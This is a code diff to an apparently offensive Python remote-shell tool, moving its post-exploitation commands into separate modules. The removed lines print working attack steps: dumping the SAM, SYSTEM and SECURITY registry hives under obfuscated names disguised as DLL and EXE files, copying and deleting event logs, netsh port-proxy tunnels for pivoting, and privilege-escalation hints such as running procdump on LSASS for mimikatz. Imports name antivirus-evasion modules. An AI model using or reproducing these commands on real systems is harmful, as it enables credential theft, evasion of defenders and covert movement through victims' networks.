@@ -3,9 +3,6 @@ from __future__ import print_function
 import sys
 import os
 import cmd
-import random
-import string
-from termcolor import cprint
 import time
 import logging
 import ntpath
@@ -13,10 +10,13 @@ from base64 import b64encode
 from six import PY2
 
 from modules.av.av_procs import av_procs
+
 from modules.av.evasion import generate_unique_signature
 from modules.av.evasion import generate_temp_permutation
+
 from modules.av.opsec import security_tools
 from modules.av.opsec import vm
+from modules.av.opsec import log_grab
 from modules.av.msft_defender import defender_checks
 
 from modules.system_info.sysinfo import basic_system_info
@@ -29,6 +29,16 @@ from modules.survey.survey import survey
 from modules.local_commands.local_commands import local_get
 from modules.local_commands.local_commands import local_put
 from modules.local_commands.local_commands import local_cd
+
+from modules.post_ex.post_exploitation import enum_credentials
+from modules.post_ex.post_exploitation import tokens
+from modules.post_ex.post_exploitation import regrip
+
+from modules.tunnels.tunnel_mgr import add_tun
+from modules.tunnels.tunnel_mgr import show_tun
+from modules.tunnels.tunnel_mgr import del_tun
+
+
 
 def random_sig():
     return generate_unique_signature()
@@ -92,6 +102,17 @@ class RemoteShell(cmd.Cmd):
     @property
     def shell_type(self): return self.__shell_type
 
+    @property
+    def out(self) -> str:
+        return self.__outputBuffer
+
+    def out_clear(self) -> None:
+        self.__outputBuffer = ''
+
+    def out_set(self, s: str) -> None:
+        self.__outputBuffer = s
+
+
     def format_print_buff(self):
         if len(self.__outputBuffer.strip('\r\n')) > 0:
             print(self.__outputBuffer)
@@ -108,21 +129,7 @@ class RemoteShell(cmd.Cmd):
         survey(self, s)
 
     def do_loggrab(self, s):
-        try:
-            prefix = 'copy '
-            log_file_name = s
-            file_path = 'C:\Windows\System32\Winevt\Logs\\'
-            # should add additional directories to copy to if below doesnt exist for some reason
-            # should always be there, but you never know, get a list and iterate over with a try: except:
-            remote_copy = ' C:\Windows\system32\spool\drivers\color'
-            combined_command = prefix + '"' + file_path + s + '"' + remote_copy
-            self.execute_remote(combined_command)
-            logging.info(s)
-            self.do_lget(remote_copy.lstrip() + '\\' + s)
-            self.execute_remote("del" + remote_copy + '\\' + s)
-            self.format_print_buff()
-        except Exception as e:
-            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
+        return log_grab(self, s)
 
     def do_mounts(self, s):
         return get_mounts(self, s)
@@ -143,31 +150,13 @@ class RemoteShell(cmd.Cmd):
 
 
     def do_addtun(self, s):
-        lport = s.split(" ")[0]
-        rhost = s.split(" ")[1]
-        rport = s.split(" ")[2]
-        try:
-            self.execute_remote(
-                "netsh interface portproxy add v4tov4 listenport=%s connectport=%s connectaddress=%s" % (
-                lport, rport, rhost))
-            self.format_print_buff()
-        except Exception as e:
-            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
+        return add_tun(self, s)
 
     def do_showtun(self, s):
-        try:
-            self.execute_remote("netsh interface portproxy show v4tov4")
-            self.format_print_buff()
-        except Exception as e:
-            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
+        return show_tun(self, s)
 
     def do_deltun(self, s):
-        lport = s.split(" ")[0]
-        try:
-            self.execute_remote("netsh interface portproxy delete v4tov4 listenport=%s" % (lport))
-            self.format_print_buff()
-        except Exception as e:
-            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
+        return del_tun(self, s)
 
     def do_ls(self, s):
         # see if user specified a dir or not
@@ -209,62 +198,10 @@ class RemoteShell(cmd.Cmd):
 
     # fix this output
     def do_tokens(self, s):
-        self.execute_remote('whoami /priv | findstr /i "Enabled"')
-        if len(self.__outputBuffer.strip('\r\n')) > 0:
-            if "SeImpersonatePrivilege" in self.__outputBuffer:
-                cprint('[*] SeImpersonate Enabled:', 'green')
-                print('\tJuicy-Potato\n\tRougeWinRM\n\tSweetPotato\n\tPrintSpoofer')
-            if "SeBackupPrivilege" in self.__outputBuffer:
-                cprint('[*] SeBackupPrivilege Enabled:', 'green')
-                print('\thttps://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1\n\thttps://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug\n\thttps://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec')
-            if "SeTakeOwnershipPrivilege" in self.__outputBuffer:
-                cprint('[*] SeTakeOwnershipPrivilege Enabled:', 'green')
-                print('\ttakeown /f "C:\windows\system32\config\SAM"\n\ticacls "C:\windows\system32\config\SAM" /grant <your_username>:F')
-            if "SeDebugPrivilege" in self.__outputBuffer:
-                cprint('[*] SeDebugPrivilege Enabled:', 'green')
-                print('\tProcdump.exe on LSASS.exe, use mimikatz')
-        else:
-            logging.info("No Valuable Tokens Found")
-        self.__outputBuffer = ''
+        return tokens(self, s)
 
     def do_creds(self, s):
-        # WDigest
-        self.execute_remote(
-            "reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential")
-        if "0x0" in self.__outputBuffer or "0" in self.__outputBuffer or "ERROR" in self.__outputBuffer:
-            logging.info("WDigest is not enabled")
-            self.__outputBuffer = ''
-        else:
-            logging.info("WDigest might be enabled --> LSASS clear text creds")
-            self.format_print_buff()
-        self.execute_remote("reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL")
-        if "0x1" in self.__outputBuffer or "1" in self.__outputBuffer:
-            logging.info("LSA Protection Enabled")
-            self.__outputBuffer = ''
-        else:
-            logging.info("LSA Protection not enabled")
-            self.__outputBuffer = ''
-        self.execute_remote("reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags")
-        if "0x0" in self.__outputBuffer or "ERROR" in self.__outputBuffer:
-            logging.info("Credential Guard Probably not enabled")
-            self.__outputBuffer = ''
-        elif "0x1" or "1" in self.__outputBuffer:
-            logging.info("Credential Guard active with UEFI lock")
-            self.__outputBuffer = ''
-        elif "0x2" or "2" in self.__outputBuffer:
-            logging.info("Credential Guard enabled without UEFI lock")
-            self.__outputBuffer = ''
-        else:
-            logging.info("Error: Couldnt enumerate Credential Guard")
-        self.execute_remote(
-            'reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT')
-        if "10" in self.__outputBuffer:
-            logging.info("Default of 10 cached logons")
-            self.__outputBuffer = ''
-
-        else:
-            logging.info("Cached Logon Credential Amount")
-            self.format_print_buff()
+        return enum_credentials(self, s)
 
     def do_securitytools(self, s):
         return security_tools(self, s)
@@ -354,27 +291,7 @@ class RemoteShell(cmd.Cmd):
             print("[!] Something went wrong, see below for error:\n", e)
 
     def do_regrip(self, s):
-        try:
-            logging.info("SAM")
-            self.execute_remote(r'reg save "HK"L""M\s""a""m"" win32.dll')
-            self.format_print_buff()
-            logging.info("System")
-            self.execute_remote(r'reg save "HK"L""M\s""ys""t"em" win32.exe')
-            self.format_print_buff()
-            logging.info("Security")
-            self.execute_remote(r'reg save "HK"L""M\s""ec""u"rit"y"" update.exe')
-            self.format_print_buff()
-            self.do_lget("win32.dll")
-            os.rename("win32.dll", "SAM")
-            self.do_lget("win32.exe")
-            os.rename("win32.exe", "System")
-            self.do_lget("update.exe")
-            os.rename("update.exe", "Security")
-            self.execute_remote("del win32.dll")
-            self.execute_remote("del win32.exe")
-            self.execute_remote("del update.exe")
-        except Exception as e:
-            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
+        return regrip(self, s)
 
 
     def do_exit(self, s):
